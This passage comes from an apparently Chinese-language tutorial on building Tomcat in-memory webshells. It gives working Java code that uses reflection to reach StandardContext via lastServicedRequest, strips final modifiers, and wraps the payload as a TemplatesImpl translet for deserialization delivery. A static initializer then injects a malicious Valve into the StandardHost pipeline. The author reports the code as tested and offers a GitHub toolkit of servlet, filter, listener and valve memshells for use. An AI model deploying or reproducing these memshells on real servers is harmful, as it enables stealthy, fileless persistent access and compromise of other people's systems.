            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static StandardContext getStandardContext2() {
        try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
                return null;

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
                ServletResponse servletResponse = threadLocalResp.get();

                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

                System.out.println(servletRequest);
                return standardContext;
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308223455523.png)

比如在StandardHost处插入Valve

```java
static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                StandardHost standardHost = (StandardHost) standardContext.getParent();
                Pipeline standardPipeline = standardHost.getPipeline();
                Valve[] valves = standardPipeline.getValves();
                boolean hasValveShell = false;
                Valve valveShell = new ValveMemShell2();
                for (Valve valve : valves) {
                    // 在这里对每个valve进行操作
                    if (valve.getClass().equals(valveShell.getClass())) {
                        hasValveShell = true;
                        break;
                    }
                }
                if (!hasValveShell) {
                    standardPipeline.addValve(valveShell);
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
```

实测可用



OK，现在考你们一个问题，如果此处pipeline不是add添加，而是set修改，那么修改哪个地方的xxx.getPipeline会影响比较小？理论推导一下

>如果是set，我们依然可以选择修改以上四个getPipeline的任意一个，但是为了最小化影响Tomcat，理论上我们应该选择修改链上的最后一个，也就是StandardWrapper.getPipeline的结果。
>
>与此同时，修改了StandardContext Pipeline或者StandardWrapper Pipeline意味着该链之后的程序都无法正常执行，比如StandardWrapperValve里原本的Filter和servlet
>
>因为Listener在StandardHostValve触发的原因，修改以上两个Pipeline还无法影响到正常的Listener。但是如果修改StandardEngine、StandardHost则会把原本的Listener也给挤掉

答案是StandardContext 和 StandardWrapper ：)

至此，Tomcat下TemplatesImpl字节码所需的servlet 、Filter 、Listener、Valve 内存马，以及三个通用内存马，以及单回显JNIMemShell全部集成于My TomcatMemShell，欢迎使用

https://github.com/godownio/TomcatMemshell
